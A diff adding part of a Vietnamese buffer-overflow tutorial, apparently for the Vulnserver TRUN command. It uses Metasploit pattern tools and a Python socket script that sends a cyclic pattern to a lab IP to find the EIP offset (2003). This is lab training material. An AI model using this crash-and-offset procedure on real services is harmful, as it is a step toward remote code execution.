@@ -1,0 +1,34 @@
+Đầu tiên chúng ta sẽ tạo 1 chuỗi radom các ký tự để chèn vào biến buffer
+Với câu lệnh bên dưới:
+
+/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 5900
+
+Copy 5900 bytes ký tự vừa tạo, dán vào biến shellcode.
+
+#!/usr/bin/python
+
+import socket
+import sys
+
+shellcode = "Aa0Aa1Aa2....." #(copy kết quả từ câu lênh phía trên và dán vào đây)
+
+s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+try:
+	connect=s.connect(('192.168.27.128',9999))
+	s.send(('TRUN /.:/' + shellcode))
+except:
+	print "Check Debugger"
+s.close()
+
+Sau khi chạy script python pattern.py
+
+Quay trở lại chương trình Debugger và check vị trí con trỏ EIP
+ (kết quả là: 386F4337)
+ 
+Tiếp tục sử dụng công cụ metasploit với tên pattern_offset.rb để truy ra vị trí offet.
+
+
+/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 5900 -q 386F4337
+
+(Kết quả Exact match at offset 2003)
